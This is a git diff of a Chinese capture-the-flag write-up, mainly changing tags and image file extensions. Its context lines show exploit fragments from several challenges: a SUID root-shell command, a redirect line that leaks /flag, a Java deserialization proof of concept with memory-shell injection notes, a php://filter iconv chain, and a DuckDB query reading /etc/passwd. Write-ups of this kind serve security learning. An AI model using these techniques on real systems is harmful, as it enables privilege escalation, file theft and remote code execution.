@@ -7,8 +7,7 @@ lastmod: "2025-12-22T01:16:06+08:00"
 image: ""
 license: ""
 categories: ["赛题"]
-tags: [""]
-
+tags: ["ThinkPHP", "Node.js", "Java反序列化"]
 ---
 ## renderme
 
@@ -23,7 +22,7 @@ find / -type f -perm -4000 2>/dev/null
 choom -n 0 -- /bin/sh -p
 ```
 
-![img](./assets/001.webp)
+![img](./assets/001.png)
 
 ## BabyUpload
 
@@ -33,7 +32,7 @@ choom -n 0 -- /bin/sh -p
 redirect permanent "/%{BASE64:%{FILE:/flag}}"
 ```
 
-![img](./assets/002.webp)
+![img](./assets/002.png)
 
 ## ezjs
 
@@ -251,7 +250,7 @@ echo "\n";
 
 然后 RCE 就行，flag 在根目录
 
-![img](./assets/003.webp)
+![img](./assets/003.png)
 
 ## easy-LUA
 
@@ -495,7 +494,7 @@ Content-Disposition: form-data; name="2"
 ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
-![img](./assets/004.webp)
+![img](./assets/004.png)
 
 ## NetWatcher
 
@@ -880,7 +879,7 @@ public Object invoke(Object proxy, Method method, Object[] args) throws Throwabl
 
 对于 hashcode 和 equals 方法直接返回，但是我触发的是 toString，他并没有明确说明，一直到获取被代理的原始对象之后，`List<Object> chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);`会检查是否有`Advisor/Advice`需要执行，然后 chain 肯定不为空，所以我们需要走这条路
 
-![img](./assets/005.webp)
+![img](./assets/005.png)
 
 现在需要寻找合适的`Advisor/Advice`类的 invoke 方法可以合适调用的，找到`AspectJAroundAdvice#invoke`
 
@@ -1174,7 +1173,7 @@ public class Poc {
 //--add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED
 ```
 
-![img](./assets/006.webp)
+![img](./assets/006.png)
 
 调用栈
 
@@ -1221,7 +1220,7 @@ at org.example.Poc.main(Poc.java:89)
 
 远程不出网，用 Java-chains 生成一个 tomcat 内存马
 
-![img](./assets/007.webp)
+![img](./assets/007.png)
 
 写一个 Spring 环境内存马注入器，注意绕过高版本机制
 
@@ -1565,7 +1564,7 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
 Connection: keep-alive
 ```
 
-![img](./assets/008.webp)
+![img](./assets/008.png)
 
 ## insph
 
@@ -1660,7 +1659,7 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.
 
 然后直接读取 flag
 
-![img](./assets/009.webp)
+![img](./assets/009.png)
 
 ## Dam
 
@@ -1670,7 +1669,7 @@ https://github.com/dbeaver/cloudbeaver 这个项目，进入靶机先进行 Duck
 SELECT * FROM read_text('/etc/passwd');
 ```
 
-![img](./assets/010.webp)
+![img](./assets/010.png)
 
 找到一个拓展hoax可以执行命令 https://duckdb.org/community_extensions/extensions/shellfs#installing-and-loading
 
